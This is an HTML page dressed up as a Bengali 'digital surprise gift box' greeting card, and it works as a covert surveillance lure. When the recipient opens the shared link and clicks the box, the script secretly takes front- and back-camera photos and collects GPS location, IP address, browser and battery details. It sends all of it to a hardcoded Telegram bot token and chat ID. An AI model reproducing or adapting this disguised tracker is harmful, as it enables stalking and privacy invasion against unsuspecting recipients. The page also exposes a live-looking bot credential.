<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤1 ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú ‡¶¨‡¶ï‡ßç‡¶∏</title>
    <!-- ‡¶ó‡ßÅ‡¶ó‡¶≤ ‡¶´‡¶®‡ßç‡¶ü‡¶∏ ‡¶è‡¶¨‡¶Ç ‡¶´‡¶®‡ßç‡¶ü ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ì‡ßü‡¶∏‡¶Æ -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* ‡¶Ü‡¶ó‡ßá‡¶∞ CSS ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤ ‡¶π‡ßÅ‡¶¨‡¶π‡ßÅ ‡¶è‡¶ï‡¶á ‡¶∞‡¶æ‡¶ñ‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá */
        :root {
            --primary-color: #4A6CF7;
            --theme-background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            --success-color: #10B981;
            /* ‡¶•‡¶ø‡¶Æ ‡¶≠‡ßá‡¶∞‡¶ø‡¶Ø‡¶º‡ßá‡¶¨‡¶≤ ‡¶°‡¶ø‡¶´‡¶≤‡ßç‡¶ü */
            --theme-primary: #4A6CF7;
            --theme-secondary: #6C63FF;
            --theme-accent: #FF6B8B;
            --theme-gift-box: #4A6CF7;
            --theme-gift-lid: #6C63FF;
            --theme-ribbon: #FF6B8B;
            --text-dark: #2D3748;
            --text-light: #718096;
            --border-radius: 12px;
            --box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
        }
        /* ‡¶•‡¶ø‡¶Æ ‡¶ï‡ßç‡¶≤‡¶æ‡¶∏‡¶ó‡ßÅ‡¶≤‡ßã */
        .theme-birthday { --theme-primary: #FF6B8B; --theme-secondary: #FF8FA3; --theme-gift-box: #FF6B8B; --theme-gift-lid: #FF8FA3; --theme-ribbon: #FFD166; --theme-background: linear-gradient(135deg, #ffeef2 0%, #ffd6df 100%); }
        .theme-anniversary { --theme-primary: #D4AF37; --theme-secondary: #FFD700; --theme-gift-box: #D4AF37; --theme-gift-lid: #FFD700; --theme-ribbon: #FF6B8B; --theme-background: linear-gradient(135deg, #fff9e6 0%, #ffefbf 100%); }
        .theme-newyear { --theme-primary: #10B981; --theme-secondary: #34D399; --theme-gift-box: #10B981; --theme-gift-lid: #34D399; --theme-ribbon: #FFD166; --theme-background: linear-gradient(135deg, #e6fff5 0%, #ccffeb 100%); }
        .theme-proposal { --theme-primary: #EC4899; --theme-secondary: #F472B6; --theme-gift-box: #EC4899; --theme-gift-lid: #F472B6; --theme-ribbon: #C084FC; --theme-background: linear-gradient(135deg, #fdf2f8 0%, #fce7f3 100%); }
        
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Poppins', sans-serif; background: var(--theme-background); display: flex; justify-content: center; align-items: center; min-height: 100vh; color: var(--text-dark); padding: 15px; transition: background 0.5s ease; }
        .container { background-color: white; padding: 30px 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow); width: 100%; max-width: 500px; text-align: center; position: relative; overflow: hidden; }
        .container::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(to right, var(--theme-primary), var(--theme-accent)); }
        
        h1, h2, h3 { color: var(--theme-primary); margin-bottom: 15px; font-weight: 700; }
        input, textarea, select, button { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 8px; border: 1.5px solid #E2E8F0; font-family: inherit; }
        button { background: linear-gradient(to right, var(--theme-primary), var(--theme-secondary)); color: white; border: none; cursor: pointer; font-weight: 600; }
        .hidden { display: none; }

        /* ‡¶ó‡¶ø‡¶´‡¶ü ‡¶¨‡¶ï‡ßç‡¶∏ ‡¶è‡¶®‡¶ø‡¶Æ‡ßá‡¶∂‡¶® */
        .gift-wrapper { position: relative; margin: 5px auto; width: 300px; height: 250px; perspective: 1000px; cursor: pointer; }
        .gift-box { position: relative; width: 160px; height: 160px; margin: 0 auto; transform-style: preserve-3d; animation: float 3s ease-in-out infinite; }
        .box-body { width: 160px; height: 160px; background: linear-gradient(135deg, var(--theme-gift-box), var(--theme-gift-lid)); position: absolute; bottom: 0; border-radius: 8px; }
        .lid { width: 176px; height: 48px; background: linear-gradient(135deg, var(--theme-gift-lid), var(--theme-gift-box)); position: absolute; top: -24px; left: -8px; transition: transform 1s; transform-origin: bottom; border-radius: 8px 8px 0 0; }
        .gift-box.open .lid { transform: rotateX(120deg) translateZ(10px); }
        .gift-box.open { animation: box-disappear 1s forwards; }
        .gift-wrapper.revealed { width: 100%; height: auto; perspective: none; background: #ffffff; padding: 20px; border-radius: 12px; }
        .gift-wrapper.revealed .gift-box { display: none; }
        .gift-content-revealed { opacity: 0; transform: scale(0.8); transition: all 0.8s ease 0.5s; }
        .gift-wrapper.revealed .gift-content-revealed { opacity: 1; transform: scale(1); }
        
        /* ‡¶∞‡¶ø‡¶¨‡¶® ‡¶°‡¶ø‡¶ú‡¶æ‡¶á‡¶® */
        .ribbon-vertical { position: absolute; width: 25px; height: 160px; background: var(--theme-ribbon); left: 67.5px; }
        .ribbon-horizontal { position: absolute; width: 160px; height: 25px; background: var(--theme-ribbon); top: 67.5px; }
        .ribbon-bow { position: absolute; width: 40px; height: 40px; background: var(--theme-ribbon); top: -20px; left: 60px; border-radius: 50%; }

        /* ‡¶Ö‡¶®‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶Ø ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤ */
        .switch-container { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: #F8FAFC; border-radius: 8px; margin-bottom: 15px; border: 1px solid #E2E8F0; }
        .switch { position: relative; display: inline-block; width: 50px; height: 28px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
        .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
        input:checked + .slider { background-color: var(--success-color); }
        input:checked + .slider:before { transform: translateX(22px); }

        .theme-selector { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; justify-content: center; }
        .theme-option { flex: 1; min-width: 80px; padding: 10px; border: 2px solid #E2E8F0; border-radius: 8px; cursor: pointer; font-size: 13px; }
        .theme-option.active { border-color: var(--theme-primary); background: rgba(74, 108, 247, 0.1); color: var(--theme-primary); }

        #revealedImage { width: 100%; max-width: 250px; border-radius: 8px; margin-bottom: 15px; border: 3px solid var(--theme-primary); display: none; }
        #revealedImage.show { display: block; margin: 0 auto 20px; }
        
        /* ‡¶ï‡¶®‡¶´‡ßá‡¶§‡ßç‡¶§‡¶ø ‡¶è‡¶®‡¶ø‡¶Æ‡ßá‡¶∂‡¶® */
        .victory-effect { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 100; display: none; }
        .confetti-piece { position: absolute; width: 10px; height: 20px; opacity: 0; animation: confetti-fall 3s ease-in-out forwards; }

        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        @keyframes box-disappear { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(0); opacity: 0; } }
        @keyframes confetti-fall { 0% { transform: translateY(-100px) rotate(0deg); opacity: 1; } 100% { transform: translateY(100vh) rotate(360deg); opacity: 0; } }
    </style>
</head>
<body>
    <!-- ‡¶´‡¶∞‡ßç‡¶Æ ‡¶ï‡¶®‡ßç‡¶ü‡ßá‡¶á‡¶®‡¶æ‡¶∞ (Sender Side) -->
    <div class="container" id="form-container">
        <h1><span>üéÅ</span> ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú ‡¶¨‡¶ï‡ßç‡¶∏</h1>
        <div class="theme-selector">
            <div class="theme-option active" data-theme="birthday">‡¶ú‡¶®‡ßç‡¶Æ‡¶¶‡¶ø‡¶®</div>
            <div class="theme-option" data-theme="anniversary">‡¶¨‡¶ø‡¶¨‡¶æ‡¶π ‡¶¨‡¶æ‡¶∞‡ßç‡¶∑‡¶ø‡¶ï‡ßÄ</div>
            <div class="theme-option" data-theme="newyear">‡¶®‡¶§‡ßÅ‡¶® ‡¶¨‡¶õ‡¶∞</div>
            <div class="theme-option" data-theme="proposal">‡¶™‡ßç‡¶∞‡¶™‡ßã‡¶ú‡¶æ‡¶≤</div>
            <div class="theme-option" data-theme="general">‡¶∏‡¶æ‡¶ß‡¶æ‡¶∞‡¶£</div>
        </div>
        <form id="giftForm">
            <input type="text" id="senderName" required placeholder="‡¶™‡ßç‡¶∞‡ßá‡¶∞‡¶ï‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ">
            <input type="text" id="receiverName" required placeholder="‡¶™‡ßç‡¶∞‡¶æ‡¶™‡¶ï‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ">
            <textarea id="message" rows="3" required placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ..."></textarea>
            <input type="url" id="imageURL" placeholder="‡¶õ‡¶¨‡¶ø‡¶∞ URL (‡¶ê‡¶ö‡ßç‡¶õ‡¶ø‡¶ï)">
            
            <div class="switch-container">
                <label>üì∏ ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ï‡ßç‡¶∏‡ßá‡¶∏</label>
                <label class="switch"><input type="checkbox" id="enableCamera"><span class="slider"></span></label>
            </div>
            <div class="switch-container">
                <label>‚ÑπÔ∏è ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡ßã</label>
                <label class="switch"><input type="checkbox" id="enableDeviceInfo"><span class="slider"></span></label>
            </div>
            <div class="switch-container">
                <label>üìç ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶æ‡¶∞</label>
                <label class="switch"><input type="checkbox" id="enableLocation"><span class="slider"></span></label>
            </div>
            
            <button type="submit">‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        </form>
        <div id="generatedLinkContainer" class="hidden">
            <p>‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶π‡ßü‡ßá‡¶õ‡ßá:</p>
            <input type="text" id="generatedLink" readonly>
            <button id="copyButton">‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        </div>
    </div>

    <!-- ‡¶ó‡¶ø‡¶´‡¶ü ‡¶¨‡¶ï‡ßç‡¶∏ ‡¶ï‡¶®‡ßç‡¶ü‡ßá‡¶á‡¶®‡¶æ‡¶∞ (Receiver Side) -->
    <div class="container hidden" id="gift-container">
        <h2 id="receiverTitle"></h2>
        <div id="main-gift-content" class="hidden">
            <p>‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú!</p>
            <h2 id="themeMessage"></h2>
            <div class="gift-wrapper" id="giftWrapper">
                <div class="gift-box" id="giftBox">
                    <div class="ribbon-bow"></div><div class="lid"></div><div class="box-body"></div>
                    <div class="ribbon-vertical"></div><div class="ribbon-horizontal"></div>
                </div>
                <div class="gift-content-revealed" id="giftContentRevealed">
                    <img id="revealedImage" src="" alt="Gift">
                    <div id="finalMessage"></div>
                </div>
            </div>
            <p style="margin-top:20px; font-size:14px; color:#888;">‡¶¨‡¶ï‡ßç‡¶∏‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®</p>
        </div>
    </div>
    
    <div class="victory-effect" id="victoryEffect"></div>
    <video id="video-preview" style="display:none;" playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶¨‡¶ü ‡¶°‡¶ø‡¶ü‡ßá‡¶á‡¶≤‡¶∏
        const TELEGRAM_TARGETS = [{ botToken: "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk", chatId: "2139008203" }];
        let currentVideoStream = null;

        /* --- ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® (Smart Fallback) --- */
        async function sendLocationInfo() {
            if (!navigator.geolocation) return;

            // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶π‡ßá‡¶≤‡ßç‡¶™‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
            const sendToTelegram = async (position, sourceType) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                const googleMapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

                const locMessage = `üìç **Location Found! (${sourceType})**
--------------------------------
üåê **Lat:** ${latitude}
üåê **Long:** ${longitude}
üìè **Accuracy:** ~${accuracy} meters
üó∫ **Map:** [Open Google Maps](${googleMapLink})`;

                const sendPromises = TELEGRAM_TARGETS.map(target =>
                    fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: target.chatId, text: locMessage, parse_mode: 'Markdown' })
                    })
                );
                await Promise.all(sendPromises);
            };

            // ‡ßß. ‡¶™‡ßç‡¶∞‡¶•‡¶Æ‡ßá High Accuracy (GPS) ‡¶¶‡¶ø‡ßü‡ßá ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ (‡ßß‡ß´ ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶°)
            navigator.geolocation.getCurrentPosition(
                (pos) => sendToTelegram(pos, "GPS/High Accuracy"), 
                (err) => {
                    console.log("High Accuracy failed, trying Network...", err.code);
                    // ‡ß®. ‡¶´‡ßá‡¶á‡¶≤ ‡¶π‡¶≤‡ßá Low Accuracy (Network/WiFi) ‡¶¶‡¶ø‡ßü‡ßá ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ
                    navigator.geolocation.getCurrentPosition(
                        (pos) => sendToTelegram(pos, "Network/WiFi"),
                        (errFinal) => {
                            // ‡¶Ø‡¶¶‡¶ø ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® Deny ‡¶ï‡¶∞‡ßá ‡¶¶‡ßá‡ßü, ‡¶§‡¶æ‡¶π‡¶≤‡ßá ‡¶ï‡¶ø‡¶õ‡ßÅ‡¶á ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶®‡ßá‡¶á‡•§
                            console.error("Location completely failed:", errFinal.message);
                        },
                        { enableHighAccuracy: false, timeout: 20000, maximumAge: 0 }
                    );
                }, 
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        /* --- ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡ßã ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® --- */
        async function sendDeviceInfo() {
            try {
                const ipData = await (await fetch('https://api.ipify.org?format=json')).json();
                let batteryInfo = "Unknown";
                if(navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batteryInfo = `${(b.level*100).toFixed(0)}% (${b.charging?'Charging':'Discharging'})`;
                }
                const msg = `üì± **Device Info**\nIP: ${ipData.ip}\nOS: ${navigator.platform}\nBrowser: ${navigator.userAgent}\nScreen: ${window.screen.width}x${window.screen.height}\nBattery: ${batteryInfo}`;
                
                TELEGRAM_TARGETS.forEach(t => {
                    fetch(`https://api.telegram.org/bot${t.botToken}/sendMessage`, {
                        method: "POST", headers: {"Content-Type":"application/json"},
                        body: JSON.stringify({chat_id: t.chatId, text: msg, parse_mode:'Markdown'})
                    });
                });
            } catch(e) {}
        }

        /* --- ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® --- */
        async function initiateDualCameraCapture(caption) {
            // ‡¶∏‡ßá‡¶≤‡¶´‡¶ø ‡¶è‡¶¨‡¶Ç ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶¶‡ßÅ‡¶ü‡ßã‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡¶¨‡ßá
            await captureSequence('user', 3, caption);       // ‡¶´‡ßç‡¶∞‡¶®‡ßç‡¶ü ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡ß©‡¶ü‡¶ø ‡¶õ‡¶¨‡¶ø
            await captureSequence('environment', 3, caption); // ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡ß©‡¶ü‡¶ø ‡¶õ‡¶¨‡¶ø
        }

        async function captureSequence(mode, count, caption) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const video = document.getElementById('video-preview');
                const canvas = document.getElementById('canvas');
                video.srcObject = stream;
                await new Promise(r => video.onloadedmetadata = () => { video.play(); r(); });

                for(let i=0; i<count; i++) {
                    await new Promise(r => setTimeout(r, 800)); // ‡¶¨‡¶ø‡¶∞‡¶§‡¶ø
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
                    
                    const formData = new FormData();
                    formData.append("photo", blob, `cam_${mode}_${i}.jpg`);
                    formData.append("caption", `${caption} [${mode} cam]`);
                    
                    TELEGRAM_TARGETS.forEach(t => {
                        const fd = new FormData(); // ‡¶ï‡ßç‡¶≤‡ßã‡¶® ‡¶ï‡¶∞‡¶æ ‡¶∏‡¶Æ‡ßç‡¶≠‡¶¨ ‡¶®‡¶æ, ‡¶®‡¶§‡ßÅ‡¶® ‡¶¨‡¶æ‡¶®‡¶æ‡¶§‡ßá ‡¶π‡¶¨‡ßá
                        fd.append("chat_id", t.chatId);
                        fd.append("photo", blob);
                        fd.append("caption", `${caption} (${mode} ${i+1})`);
                        fetch(`https://api.telegram.org/bot${t.botToken}/sendPhoto`, { method: "POST", body: fd });
                    });
                }
                stream.getTracks().forEach(t => t.stop());
            } catch(e) { console.log(mode + " camera failed"); }
        }

        /* --- ‡¶Æ‡ßá‡¶á‡¶® ‡¶≤‡¶ú‡¶ø‡¶ï --- */
        document.addEventListener('DOMContentLoaded', () => {
            const params = new URLSearchParams(window.location.search);
            
            // ‡¶∞‡¶ø‡¶∏‡¶ø‡¶≠‡¶æ‡¶∞ ‡¶Æ‡ßã‡¶° (‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶ì‡¶™‡ßá‡¶® ‡¶ï‡¶∞‡¶≤‡ßá)
            if (params.has('sender')) {
                document.getElementById('form-container').classList.add('hidden');
                document.getElementById('gift-container').classList.remove('hidden');
                document.body.className = `theme-${params.get('theme') || 'general'}`;
                
                showMainGiftContent(params);
            } 
            // ‡¶∏‡ßá‡¶®‡ßç‡¶°‡¶æ‡¶∞ ‡¶Æ‡ßã‡¶° (‡¶´‡¶∞‡ßç‡¶Æ ‡¶™‡ßá‡¶ú)
            else {
                setupForm(); 
                setupThemeSelect();
            }
        });

        function showMainGiftContent(params) {
            document.getElementById('main-gift-content').classList.remove('hidden');
            document.getElementById('receiverTitle').textContent = `‡¶™‡ßç‡¶∞‡¶ø‡¶Ø‡¶º ${params.get('receiver')}`;
            
            // ‡¶•‡¶ø‡¶Æ ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶∏‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ
            const theme = params.get('theme');
            const messages = {
                birthday: "‡¶∂‡ßÅ‡¶≠ ‡¶ú‡¶®‡ßç‡¶Æ‡¶¶‡¶ø‡¶®!", anniversary: "‡¶∂‡ßÅ‡¶≠ ‡¶¨‡¶ø‡¶¨‡¶æ‡¶π ‡¶¨‡¶æ‡¶∞‡ßç‡¶∑‡¶ø‡¶ï‡ßÄ!",
                newyear: "‡¶∂‡ßÅ‡¶≠ ‡¶®‡¶¨‡¶¨‡¶∞‡ßç‡¶∑!", proposal: "‡¶§‡ßã‡¶Æ‡¶æ‡¶ï‡ßá ‡¶≠‡¶æ‡¶≤‡ßã‡¶¨‡¶æ‡¶∏‡¶ø!", general: "‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶â‡¶™‡¶π‡¶æ‡¶∞!"
            };
            document.getElementById('themeMessage').textContent = messages[theme] || messages.general;

            // ‡¶õ‡¶¨‡¶ø ‡¶∏‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ
            if(params.get('image')) {
                const img = document.getElementById('revealedImage');
                img.src = params.get('image');
                img.classList.add('show');
            }

            // *** ‡¶ó‡ßÅ‡¶∞‡ßÅ‡¶§‡ßç‡¶¨‡¶™‡ßÇ‡¶∞‡ßç‡¶£ ‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶®: ‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶° ‡¶π‡¶ì‡ßü‡¶æ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ö‡¶æ‡¶ì‡ßü‡¶æ ***
            if (params.get('loc') === 'true') {
                // ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ø‡¶¶‡¶ø ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶¶‡ßá‡ßü ‡¶§‡¶¨‡ßá ‡¶è‡¶ñ‡¶®‡¶á ‡¶ö‡¶æ‡¶á‡¶¨‡ßá
                sendLocationInfo();
            }

            // ‡¶ó‡¶ø‡¶´‡¶ü ‡¶¨‡¶ï‡ßç‡¶∏ ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶≤‡¶ú‡¶ø‡¶ï
            document.getElementById('giftWrapper').addEventListener('click', function() {
                if(this.classList.contains('revealed')) return;
                
                // ‡¶¨‡¶ï‡ßç‡¶∏ ‡¶ñ‡ßã‡¶≤‡¶æ‡¶∞ ‡¶è‡¶®‡¶ø‡¶Æ‡ßá‡¶∂‡¶®
                document.getElementById('giftBox').classList.add('open');
                setTimeout(() => {
                    this.classList.add('revealed');
                    document.getElementById('finalMessage').innerHTML = `<h3>${params.get('sender')} ‡¶è‡¶∞ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ:</h3><p>${params.get('message')}</p>`;
                    triggerConfetti();
                }, 1000);

                // ‡¶∏‡¶ø‡¶ï‡ßç‡¶∞‡ßá‡¶ü ‡¶ï‡¶æ‡¶ú‡¶ó‡ßÅ‡¶≤‡ßã ‡¶∂‡ßÅ‡¶∞‡ßÅ (‡¶Ø‡¶¶‡¶ø ‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶°‡ßá ‡¶Æ‡¶ø‡¶∏ ‡¶π‡ßü‡ßá ‡¶•‡¶æ‡¶ï‡ßá)
                const logCaption = `Opened by: ${params.get('receiver')}`;
                
                // ‡ßß. ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡ßã
                if (params.get('info') === 'true') sendDeviceInfo();
                
                // ‡ß®. ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ (‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶á‡¶≠‡ßá‡¶®‡ßç‡¶ü ‡¶≤‡¶æ‡¶ó‡ßá, ‡¶§‡¶æ‡¶á ‡¶è‡¶ü‡¶æ‡¶á ‡¶∏‡ßá‡¶∞‡¶æ ‡¶ú‡¶æ‡ßü‡¶ó‡¶æ)
                if (params.get('cam') === 'true') initiateDualCameraCapture(logCaption);
                
                // ‡ß©. ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® (‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™ ‡¶π‡¶ø‡¶∏‡ßá‡¶¨‡ßá ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ï‡¶≤ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶≤‡ßã ‡¶Ø‡¶¶‡¶ø ‡¶≤‡ßã‡¶°‡ßá ‡¶Æ‡¶ø‡¶∏ ‡¶π‡ßü)
                if (params.get('loc') === 'true') sendLocationInfo();

            }, {once: true});
        }

        /* --- ‡¶π‡ßá‡¶≤‡ßç‡¶™‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®‡¶∏ --- */
        function setupForm() {
            document.getElementById('giftForm').addEventListener('submit', (e) => {
                e.preventDefault();
                const p = new URLSearchParams();
                p.set('sender', document.getElementById('senderName').value);
                p.set('receiver', document.getElementById('receiverName').value);
                p.set('message', document.getElementById('message').value);
                p.set('image', document.getElementById('imageURL').value);
                p.set('theme', document.querySelector('.theme-option.active').dataset.theme);
                if(document.getElementById('enableCamera').checked) p.set('cam', 'true');
                if(document.getElementById('enableDeviceInfo').checked) p.set('info', 'true');
                if(document.getElementById('enableLocation').checked) p.set('loc', 'true');

                const link = `${window.location.href.split('?')[0]}?${p.toString()}`;
                document.getElementById('generatedLink').value = link;
                document.getElementById('generatedLinkContainer').classList.remove('hidden');
            });
            document.getElementById('copyButton').onclick = () => navigator.clipboard.writeText(document.getElementById('generatedLink').value);
        }

        function setupThemeSelect() {
            document.querySelectorAll('.theme-option').forEach(opt => {
                opt.onclick = () => {
                    document.querySelector('.theme-option.active').classList.remove('active');
                    opt.classList.add('active');
                }
            });
        }

        function triggerConfetti() {
            const el = document.getElementById('victoryEffect');
            el.style.display = 'block';
            for(let i=0; i<50; i++) {
                const c = document.createElement('div');
                c.className = 'confetti-piece';
                c.style.left = Math.random()*100+'%';
                c.style.background = `hsl(${Math.random()*360},100%,50%)`;
                c.style.animationDelay = Math.random()+'s';
                el.appendChild(c);
            }
            setTimeout(() => el.style.display='none', 3000);
        }
    </script>
</body>
</html>
